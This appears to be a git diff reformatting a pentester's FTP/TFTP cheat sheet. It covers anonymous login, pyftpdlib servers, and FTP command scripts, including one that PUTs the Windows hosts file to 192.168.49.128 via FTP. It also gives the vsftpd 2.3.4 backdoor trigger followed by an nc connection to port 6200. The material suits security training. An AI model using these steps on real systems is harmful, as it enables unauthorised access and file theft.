@@ -1,6 +1,6 @@
 ---
-icon: file-chart-column
 description: File Transfer Protocol
+icon: file-chart-column
 ---
 
 # FTP
@@ -11,19 +11,16 @@ description: File Transfer Protocol
 * <mark style="color:purple;">Always check for</mark> <mark style="color:orange;">**`anonymous`**</mark> <mark style="color:purple;">login being enabled.</mark>
 {% endhint %}
 
-***
+<details>
+
+<summary><mark style="color:purple;"><strong><code>Basic Commands</code></strong></mark></summary>
 
 {% hint style="info" %}
-### <mark style="color:purple;">Basic Commands</mark>
-
 * <mark style="color:purple;">Start the service:</mark>
 
-{% code lineNumbers="true" %}
 ```bash
 ftp <IP>
-tftp <IP>
 ```
-{% endcode %}
 
 * <mark style="color:purple;">To login as any other user:</mark>
 
@@ -86,60 +83,71 @@ PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts
 ```sh
 curl -O ftp://<server-address>/path/to/file
 ```
+{% endhint %}
 
-***
+{% hint style="info" %}
+
 
 #### <mark style="color:orange;">`TFTP`</mark>
 
+{% code title="Start the service" %}
+```sh
+tftp <IP>
+```
+{% endcode %}
+
 * <mark style="color:purple;">Uses</mark> <mark style="color:orange;">**`binary`**</mark> <mark style="color:purple;">mode for non-text files:</mark>
 
-```sh
+```
 mode binary
 ```
 
 * <mark style="color:purple;">Uses</mark> <mark style="color:orange;">**`ASCII`**</mark> <mark style="color:purple;">mode for text files:</mark>
 
-```sh
+```
 mode ascii
 ```
 
 * <mark style="color:purple;">To look for files in the</mark>  <mark style="color:orange;">**`TFTP`**</mark> <mark style="color:purple;">root:</mark>
 
-```
+```sh
 find / -name file.txt
 ```
 {% endhint %}
 
-***
+</details>
 
-{% hint style="info" %}
-## <mark style="color:purple;">Enumeration</mark>
+<details>
+
+<summary><mark style="color:purple;"><strong><code>Enumeration</code></strong></mark></summary>
 
 * <mark style="color:purple;">Is always good practice to look for vulnerabilities:</mark>
 
-```bash
+```sh
 searchsploit <version>
 ```
 
-* <mark style="color:purple;">Check where you land:</mark>
+* <mark style="color:purple;">Always check where you land:</mark>
 
-```bash
+```sh
 pwd
 ```
 
 * <mark style="color:purple;">List directories:</mark>
 
-```bash
+```sh
 dir
 ```
 
-* <mark style="color:purple;">This is the default config file for</mark> <mark style="color:orange;">**`TFTP`**</mark> <mark style="color:purple;">--></mark> <mark style="color:orange;">**`tftpd-hpa`**</mark>
+{% hint style="info" %}
+<mark style="color:purple;">This is the default config file for</mark> <mark style="color:orange;">**`TFTP`**</mark> <mark style="color:purple;">--></mark> <mark style="color:orange;">**`tftpd-hpa`**</mark>
 {% endhint %}
 
-***
+</details>
 
-{% hint style="info" %}
-### <mark style="color:orange;">`FTP`</mark> <mark style="color:green;">`Python`</mark> <mark style="color:purple;">Server</mark>
+<details>
+
+<summary><mark style="color:purple;"><strong><code>Set a Python Server</code></strong></mark></summary>
 
 * <mark style="color:purple;">First, Install the</mark> <mark style="color:green;">**`Python`**</mark> <mark style="color:purple;">module:</mark>
 
@@ -153,18 +161,19 @@ sudo pip3 install pyftpdlib
 sudo python3 -m pyftpdlib --port 21
 ```
 
-* <mark style="color:purple;">By default,</mark> <mark style="color:orange;">**`pyftpdlib`**</mark> <mark style="color:purple;">uses</mark> <mark style="color:orange;">**`Port 2121`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`anonymous`**</mark> <mark style="color:purple;">authentication is enabled by default if we don't set a user and password.</mark>
-* <mark style="color:purple;">Allow users to upload files:</mark>
+* <mark style="color:purple;">By default,</mark> <mark style="color:orange;">**`pyftpdlib`**</mark> <mark style="color:purple;">uses</mark> <mark style="color:orange;">**`Port 2121`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`anonymous`**</mark> <mark style="color:purple;">authentication is enabled by default if we don't set a user and password.</mark>
 
+{% code title="Allow write permissions" overflow="wrap" %}
 ```sh
 sudo python3 -m pyftpdlib --port 21 --write
 ```
-{% endhint %}
+{% endcode %}
 
-***
+</details>
 
-{% hint style="info" %}
-### <mark style="color:purple;">Create a command file</mark>
+<details>
+
+<summary><mark style="color:purple;"><strong><code>Create a command file</code></strong></mark></summary>
 
 * <mark style="color:purple;">Is possible to create command files and execute then using the</mark> <mark style="color:orange;">**`-s`**</mark> <mark style="color:purple;">flag:</mark>
 
@@ -174,7 +183,7 @@ ftp -v -n -s:ftpcommand.txt
 
 * <mark style="color:purple;">Copy this in to a file to create a script that will</mark> <mark style="color:orange;">**`download`**</mark> <mark style="color:purple;">a file:</mark>
 
-```sh
+```bash
 open 192.168.49.128
 USER anonymous
 binary
@@ -191,13 +200,14 @@ binary
 PUT c:\windows\system32\drivers\etc\hosts
 bye
 ```
-{% endhint %}
 
-***
+</details>
+
+<details>
+
+<summary><mark style="color:purple;"><strong><code>Vulnerabilities</code></strong></mark></summary>
 
 {% hint style="danger" %}
-## <mark style="color:purple;">Vulnerabilities</mark>
-
 ### <mark style="color:orange;">`vsftpd 2.3.4`</mark>
 
 * <mark style="color:purple;">Connect to</mark> <mark style="color:orange;">**`FTP`**</mark> <mark style="color:purple;">with any username that contains</mark> <mark style="color:orange;">**`:)`**</mark><mark style="color:purple;">, and</mark> <mark style="color:orange;">**`any password`**</mark><mark style="color:purple;">.</mark>
@@ -212,8 +222,6 @@ nc 10.10.10.131 21
 ```bash
 nc 10.10.10.131 6200
 ```
-
-***
-
-
 {% endhint %}
+
+</details>
